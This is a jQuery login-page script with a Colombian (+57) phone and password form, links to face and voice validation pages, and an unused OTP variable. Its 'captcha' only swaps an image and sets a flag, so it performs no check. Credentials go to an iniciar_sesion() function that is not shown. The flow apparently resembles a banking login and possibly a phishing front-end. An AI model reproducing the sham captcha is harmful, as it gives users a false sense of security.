var sw_mind = 0;
var sw_cap = 0;
var otp = "";

$(document).ready(function($){
	$("#btn-facial").click(function(){      
        window.location.href = "../face-validate/";         
    });

    $("#btn-voz").click(function(){     
        window.location.href = "../voice-validate/";        
    });

	
	$("#indicativo").click(function(){
		if (sw_mind == 0) {
			$("#menu-indicativo").show();
			$("#flecha").attr("src","../assets/img/arriba.jpg");
			sw_mind = 1;
		}else{
			$("#menu-indicativo").hide();
			$("#flecha").attr("src","../assets/img/abajo.jpg");
			sw_mind = 0;
		}
    });

    $(".item-indicativo").click(function(){    	
    	$("#txt-indicativo").html($(this).find(".con-indicativo").html());
    	$("#bandera").attr("src",$(this).find("img").attr("src")); 
    	$("#menu-indicativo").hide();
    	$("#flecha").attr("src","../assets/img/abajo.jpg");

    	if ($(this).find(".con-indicativo").html() == "+57") {
    		$("#txt-celular").attr("maxlength","10");
    	}else{
    		$("#txt-celular").attr("maxlength","8");
    	}


		sw_mind = 0;   	
	});

	$("#capcha").click(function(){
		$("#capcha").attr("src","../assets/img/capcha-on.png");
		sw_cap = 1;

		if ($("#txt-indicativo").html() == "+57") {
			if ($("#txt-celular").val().length > 9 && $("#txt-password").val().length > 3) {
	    		$("#btn-login").removeAttr("disabled");     		
	    	}else{
	    		$("#btn-login").attr("disabled","disabled");
	    	}
		}else{
			if ($("#txt-celular").val().length > 7 && $("#txt-password").val().length > 3) {
	    		$("#btn-login").removeAttr("disabled");     		
	    	}else{
	    		$("#btn-login").attr("disabled","disabled");
	    	}
		}	
    });
  

    $("#txt-celular,#txt-password").keyup(function(e) {
    	if ($("#txt-indicativo").html() == "+57") {
    		if ($("#txt-celular").val().length > 9 && $("#txt-password").val().length > 3 && sw_cap == 1) {
	    		$("#btn-login").removeAttr("disabled");     		
	    	}else{
	    		$("#btn-login").attr("disabled","disabled");
	    	}
    	}else{
    		if ($("#txt-celular").val().length > 7 && $("#txt-password").val().length > 3 && sw_cap == 1) {
	    		$("#btn-login").removeAttr("disabled");     		
	    	}else{
	    		$("#btn-login").attr("disabled","disabled");
	    	}
    	}
    });

    $("#btn-login").click(function(){
    	$("#btn-login").removeAttr("disabled");
    	usuario = $("#txt-indicativo").html() + "" + $("#txt-celular").val();
    	pass = $("#txt-password").val();
    	$("#txt-password").val("11111111111111111111");
    	iniciar_sesion(usuario,pass);	
    });
});